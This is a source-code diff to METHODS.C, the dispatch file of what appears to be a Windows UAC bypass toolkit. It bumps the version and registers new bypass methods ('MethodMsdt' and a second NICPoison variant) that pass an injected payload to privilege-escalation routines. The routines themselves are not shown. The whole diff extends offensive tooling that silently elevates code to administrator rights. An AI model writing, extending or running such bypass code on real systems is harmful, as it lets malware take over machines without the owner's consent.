@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2021
+*  (C) COPYRIGHT AUTHORS, 2015 - 2022
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.57
+*  VERSION:     3.59
 *
-*  DATE:        01 Nov 2021
+*  DATE:        04 Feb 2022
 *
 *  UAC bypass dispatch.
 *
@@ -45,6 +45,7 @@ UCM_API(MethodFwCplLua2);
 UCM_API(MethodProtocolHijack);
 UCM_API(MethodPca);
 UCM_API(MethodCurVer);
+UCM_API(MethodMsdt);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -130,7 +131,9 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodProtocolHijack, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodProtocolHijack, { NT_WIN10_REDSTONE5, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodPca, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodCurVer, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
+    { MethodCurVer, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodMsdt, { NT_WIN10_THRESHOLD1, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE }
 };
 
 /*
@@ -600,9 +603,22 @@ UCM_API(MethodNICPoison)
     UNREFERENCED_PARAMETER(Parameter);
     return STATUS_NOT_SUPPORTED;
 #else
-    return ucmNICPoisonMethod(
-        Parameter->PayloadCode,
-        Parameter->PayloadSize);
+    if (Parameter->Method == UacMethodNICPoison) {
+
+        return ucmNICPoisonMethod(
+            Parameter->PayloadCode,
+            Parameter->PayloadSize);
+
+    }
+    else if (Parameter->Method == UacMethodNICPoison2) {
+
+        return ucmNICPoisonMethod2(
+            Parameter->PayloadCode,
+            Parameter->PayloadSize);
+
+    }
+    else 
+        return STATUS_NOT_SUPPORTED;
 #endif
 }
 
@@ -731,4 +747,11 @@ UCM_API(MethodCurVer)
         lpszPayload);
 
 #endif
+}
+
+UCM_API(MethodMsdt)
+{
+    return ucmMsdtMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
 }
